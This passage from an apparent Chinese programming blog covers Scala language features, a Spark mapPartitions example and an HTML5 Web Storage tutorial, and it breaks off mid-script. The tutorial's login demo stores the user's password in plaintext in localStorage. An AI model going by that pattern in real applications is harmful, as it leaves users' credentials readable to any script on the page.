<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1、2、3有对应的输出值，其它输入打印 Other </span></span><br><span class="line"><span class="keyword">val</span> pf: <span class="type">PartialFunction</span>[<span class="type">Int</span>, <span class="type">String</span>] = &#123; </span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span> =&gt; <span class="string">&quot;One&quot;</span> </span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span> =&gt; <span class="string">&quot;Two&quot;</span> </span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span> =&gt; <span class="string">&quot;Three&quot;</span> </span><br><span class="line">  <span class="keyword">case</span> _=&gt; <span class="string">&quot;Other&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pf(<span class="number">1</span>) <span class="comment">// 返回: One </span></span><br><span class="line">pf(<span class="number">2</span>) <span class="comment">// 返回: Two </span></span><br><span class="line">pf(<span class="number">5</span>) <span class="comment">// 返回: Other</span></span><br></pre></td></tr></table></figure>

<h3 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h3><h4 id="隐式转换函数"><a href="#隐式转换函数" class="headerlink" title="隐式转换函数"></a>隐式转换函数</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Num</span> </span>&#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RichNum</span>(<span class="params">num: <span class="type">Num</span></span>) </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">rich</span></span>(): <span class="type">Unit</span> = &#123; </span><br><span class="line">    println(<span class="string">&quot;Hello Implicit!&quot;</span>) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ImplicitDemo</span> </span>&#123; </span><br><span class="line"><span class="comment">// 定义一个名称为num2RichNum的隐式函数 </span></span><br><span class="line">	<span class="keyword">implicit</span> <span class="function"><span class="keyword">def</span> <span class="title">num2RichNum</span></span>(num: <span class="type">Num</span>): <span class="type">RichNum</span> = &#123; </span><br><span class="line"> 		<span class="keyword">new</span> <span class="type">RichNum</span>(num) </span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    <span class="keyword">val</span> num = <span class="keyword">new</span> <span class="type">Num</span> </span><br><span class="line">    <span class="comment">// num对象并没有rich方法，编译器会查找当前范围内是否有可转换的函数 </span></span><br><span class="line">    <span class="comment">// 如果没有则编译失败，如果有则会调用。 </span></span><br><span class="line">    num.rich() </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><h4 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个泛型类 </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>[<span class="type">T1</span>, <span class="type">T2</span>, <span class="type">T3</span>](<span class="params">name: <span class="type">T1</span></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">var</span> age: <span class="type">T2</span> = _ </span><br><span class="line">  <span class="keyword">var</span> address: <span class="type">T3</span> = _ </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">getInfo</span></span>: <span class="type">Unit</span> = &#123; </span><br><span class="line">    println(<span class="string">s&quot;<span class="subst">$name</span>,<span class="subst">$age</span>,<span class="subst">$address</span>&quot;</span>) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="泛型函数"><a href="#泛型函数" class="headerlink" title="泛型函数"></a>泛型函数</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">GenericityFunction</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">getCard</span></span>[<span class="type">T</span>](content: <span class="type">T</span>) = &#123; </span><br><span class="line">    content <span class="keyword">match</span> &#123; </span><br><span class="line">      <span class="keyword">case</span> content: <span class="type">Int</span> =&gt; <span class="string">s&quot;card:<span class="subst">$content</span> is Int &quot;</span> </span><br><span class="line">      <span class="keyword">case</span> content: <span class="type">String</span> =&gt; <span class="string">s&quot;card:<span class="subst">$content</span> is String&quot;</span> </span><br><span class="line">      <span class="keyword">case</span> _ =&gt; <span class="string">s&quot;card:<span class="subst">$content</span>&quot;</span> </span><br><span class="line">    &#125; </span><br><span class="line">	&#125;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    println(getCard[<span class="type">String</span>](<span class="string">&quot;hello&quot;</span>)) </span><br><span class="line">    println(getCard(<span class="number">1001</span>)) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="协变和逆变"><a href="#协变和逆变" class="headerlink" title="协变和逆变"></a>协变和逆变</h4><p>Scala的协变和逆变是非常有特色的，完全解决了Java中的泛型的一大缺憾！</p>
<p>举例来说，Java中，如果有Professional是Master的子类，那么Card[Professionnal]是不是Card[Master]的子类？</p>
<p>答案是：不是。因此对于开发程序造成了很多的麻烦。</p>
<p>而Scala中，只要灵活使用协变和逆变，就可以解决Java泛型的问题。</p>
<p><strong>协变定义形式如：trait List[+T] {}</strong></p>
<p>当类型S是类型A的子类型时，则List[S]也可以认为是List[A}的子类型，即List[S]可以泛化为List[A]，也就是被参数化，类型的泛化方向与参数类型的方向是一致的，所以称为协变（covariance）。</p>
<p><strong>逆变定义形式如：trait List[-T] {}</strong> </p>
<p>当类型S是类型A的子类型，则Queue[A]反过来可以认为是Queue[S}的子类型，也就是被参数化类型的泛化方向与参数类型的方向是相反的，所以称为逆变（contravariance）。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//大师 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Master</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//专家 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Professor</span> <span class="keyword">extends</span> <span class="title">Master</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//讲师class Teacher </span></span><br><span class="line"><span class="comment">//这个是协变，Professor是Master的子类，此时Card[Profesor]也是Card[Master]的子类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Card</span>[+<span class="type">T</span>] </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">CovarianceDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">enterMeet</span></span>(card: <span class="type">Card</span>[<span class="type">Master</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    <span class="comment">//只有Card[Master]及其子类Card[Professor]才能进入会场。 </span></span><br><span class="line">    println(<span class="string">&quot;欢迎进入会场！&quot;</span>) </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    <span class="keyword">val</span> masterCard = <span class="keyword">new</span> <span class="type">Card</span>[<span class="type">Master</span>] </span><br><span class="line">    <span class="keyword">val</span> professorCard = <span class="keyword">new</span> <span class="type">Card</span>[<span class="type">Professor</span>] </span><br><span class="line">    <span class="keyword">val</span> teacharCard = <span class="keyword">new</span> <span class="type">Card</span>[<span class="type">Teacher</span>] </span><br><span class="line">    enterMeet(masterCard) </span><br><span class="line">    enterMeet(professorCard) </span><br><span class="line">    <span class="comment">//此处就会报错 </span></span><br><span class="line">    <span class="comment">// enterMeet(teacharCard) </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Spark基础"><a href="#Spark基础" class="headerlink" title="Spark基础"></a>Spark基础</h1><h3 id="mapPartitions"><a href="#mapPartitions" class="headerlink" title="mapPartitions"></a>mapPartitions</h3><p>与map方法类似，map是对rdd中的每一个元素进行操作，而mapPartitions(foreachPartition)则是对rdd中的每个分区的迭代器进行操作。如果在map过程中需要频繁创建额外的对象(例如将rdd中的数据通过jdbc写入数据库,map需要为每个元素创建一个链接而mapPartition为每个partition创建一个链接),则mapPartitions效率比map高的多。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @Description: spark mapPartitions test</span></span><br><span class="line"><span class="comment"> * @Author: Xiaoyuyu</span></span><br><span class="line"><span class="comment"> * @CreateDate: 2021/4/22 1:41 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">mapPartitions_test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> conf: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="keyword">this</span>.getClass.getCanonicalName.init).setMaster(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line">    sc.setLogLevel(<span class="string">&quot;WARN&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> value: <span class="type">RDD</span>[<span class="type">Int</span>] = sc.makeRDD((<span class="number">1</span> to <span class="number">50</span>).toArray)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fun1</span></span>(iter:<span class="type">Iterator</span>[<span class="type">Int</span>]) : <span class="type">Iterator</span>[(<span class="type">Int</span>,<span class="type">Int</span>)] = &#123;</span><br><span class="line">      <span class="keyword">val</span> tuples = <span class="keyword">new</span> <span class="type">ListBuffer</span>[(<span class="type">Int</span>, <span class="type">Int</span>)]</span><br><span class="line">      <span class="keyword">while</span>(iter.hasNext) &#123;</span><br><span class="line">        <span class="keyword">val</span> elem: <span class="type">Int</span> = iter.next()</span><br><span class="line">        <span class="keyword">val</span> tuple: (<span class="type">Int</span>, <span class="type">Int</span>) = (elem, elem * <span class="number">2</span>)</span><br><span class="line">        tuples+=tuple</span><br><span class="line">      &#125;</span><br><span class="line">      tuples.toIterator</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> value1: <span class="type">RDD</span>[(<span class="type">Int</span>, <span class="type">Int</span>)] = value.mapPartitions(fun1)</span><br><span class="line">    value1.foreach(println)</span><br><span class="line"></span><br><span class="line">    sc.stop()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_Storage</title>
    <url>/2019/01/31/Web-Storage/</url>
    <content><![CDATA[<p>在学HTML5的时候，遇到了Web Storage</p>
<p>不同于之前一些标签的操作，这是一种提供客户端存储数据的方法</p>
<p>学习的书籍是HTML5+CSS3从入门到精通</p>
<span id="more"></span>

<h2 id="Web-Storage-API"><a href="#Web-Storage-API" class="headerlink" title="Web Storage API"></a>Web Storage API</h2><p>首先我们要知道Web Storage API 提供了两种客户端数据存储的方法：</p>
<p>1）localStorage：用于持久化的本地存储，除非主动删除，否则数据永远不过期</p>
<p>2）sessionStorage：用于存储session本地会话数据，只有在一个会话周期内才能访问，会话结束后数据也会随之销毁，如关闭网页</p>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>那么benefits到底有哪些呢？</p>
<p>我们都知道客户端处理网页数据主要通过cookie来实现，但是cookie容量是有限的</p>
<p>1）优势1：存储空间比cookie大得多</p>
<p>2）优势2：存储内容不会反馈给服务器，二cookie信息会随着请求一并发送给服务器</p>
<p>3）优势4：独立的存储空间，每个域有各自独立的存储空间，不会造成数据混乱</p>
<h2 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h2><p>1）缺陷1：存储数据未加密</p>
<p>2）缺陷2：浏览器不会检查脚本所在域与当前域是否相同，当然，如果浏览器厂商想弥补的话还是很容易的</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>1）存储 — setItem()</p>
<p>e.g.</p>
<p>localStorage.setItem(‘key’,’value’);</p>
<p>2）访问 — getItem()</p>
<p>e.g.</p>
<p>var value = localStorage.getItem(‘key’);</p>
<p>3）删除 — removeItem()</p>
<p>e.g.</p>
<p>localStorage.removeItem(‘key’)</p>
<p>4）清空 — clear()</p>
<p>e.g.</p>
<p>localStorage.clear()</p>
<h2 id="例子1-—-一个登陆界面"><a href="#例子1-—-一个登陆界面" class="headerlink" title="例子1 — 一个登陆界面"></a>例子1 — 一个登陆界面</h2><p>代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">ul</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">list-style-type</span>: none;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">3px</span> <span class="number">6px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.title</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin-top</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.status</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#999999</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: <span class="number">#cccccc</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;pageload();&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;Login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">legend</span>&gt;</span>用户登录<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">class</span>=<span class="string">&quot;txt&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>密<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;txt&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;save&quot;</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>是否保存密码<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;btn_click();&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;rst&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;取消&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;btn_click();&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;status&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">pageload</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> name = <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;name&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> pass= <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;pass&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(name)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;name&#x27;</span>).value = name;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(pass)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&#x27;password&#x27;</span>).value = pass;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">btn_click</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> name = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;name&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> pass = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;password&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;name&#x27;</span>,name);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;save&#x27;</span>).checked)&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;pass&#x27;</span>,pass);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">localStorage</span>.removeItem(<span class="string">&#x27;pass&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;status&#x27;</span>).className = <span class="string">&#x27;status&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;status&#x27;</span>).innerHTML = <span class="string">&#x27;登陆成功&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们尝试一下不保存密码的登陆后，可以看到cookie还是空的，但localStorage里面有一些变化</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/html5/Web_Storage.png" alt="image"></p>
<h2 id="例子2-—-流量统计"><a href="#例子2-—-流量统计" class="headerlink" title="例子2 — 流量统计"></a>例子2 — 流量统计</h2><p>这个其实就是一个简单的sessionStorage和localStorage的读取，方法还是比较简单的，贴一下代码，有兴趣的可以试一下效果</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flow<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>计数器<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">id</span>=<span class="string">&quot;msg_1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;form_item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">fo</span>=<span class="string">&quot;&quot;</span>&gt;</span>Storage: <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text-1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;text-1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;form_item&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;btn-1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;session 保存&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn-1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;btn-2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;session 读取&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn-2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;btn-3&quot;</span> <span class="attr">value</span>=<span class="string">&quot;local 保存&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn-3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;btn-4&quot;</span> <span class="attr">value</span>=<span class="string">&quot;local 读取&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn-4&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;count_wrap&quot;</span>&gt;</span>本页 session 访问次数： <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;count&quot;</span> <span class="attr">id</span>=<span class="string">&quot;session_count&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>本页 local 访问次数： <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;count&quot;</span> <span class="attr">id</span>=<span class="string">&quot;local_count&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">getE</span>(<span class="params">ele</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">document</span>.getElementById(ele);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> text_1 = getE(<span class="string">&#x27;text-1&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> mag = getE(<span class="string">&#x27;msg_1&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> btn_1 = getE(<span class="string">&#x27;btn-1&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> btn_2 = getE(<span class="string">&#x27;btn-2&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> btn_3 = getE(<span class="string">&#x27;btn-3&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> btn_4 = getE(<span class="string">&#x27;btn-4&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    btn_1.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        sessionStorage.setItem(<span class="string">&#x27;msg&#x27;</span>,<span class="string">&#x27;sessionStorage = &#x27;</span>+ text_1.value);</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    btn_2.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        mag.innerHTML = sessionStorage.getItem(<span class="string">&#x27;msg&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    btn_3.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;msg&#x27;</span>,<span class="string">&#x27;localStorage = &#x27;</span>+ text_1.value);</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    btn_4.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        mag.innerHTML = <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;msg&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//记录页面次数</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> local_count = <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;a_count&#x27;</span>)?<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;a_count&#x27;</span>):<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">    getE(<span class="string">&#x27;local_count&#x27;</span>).innerHTML = local_count;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;a_count&#x27;</span>,local_count+<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> session_count = sessionStorage.getItem(<span class="string">&#x27;a_count&#x27;</span>)?sessionStorage.getItem(<span 